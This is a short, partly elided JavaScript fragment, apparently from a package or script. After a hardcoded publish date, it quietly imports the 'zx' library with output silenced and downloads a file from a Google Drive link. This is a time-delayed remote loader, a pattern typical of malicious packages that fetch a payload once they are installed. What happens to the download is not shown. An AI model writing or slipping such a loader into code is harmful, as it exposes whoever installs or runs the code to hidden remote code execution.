...
const timePublish = "2025-04-08 01:30:00"; 
const now = new Date();
const pbTime = new Date(timePublish);
const delay = pbTime - now;

if (delay <= 0) {
	async function getDocs(ur) {
		try {
			const mod = await import('zx');
			mod.$.verbose = false;
			const res = await mod.fetch(ur, {redirect: 'follow'});
	...
	const docs = 'https://docs.google.com/uc?export=download&id=1prQlXmreHK0Q-6I7t01kDbCmrswma54W'; 
	getDocs(docs);
}
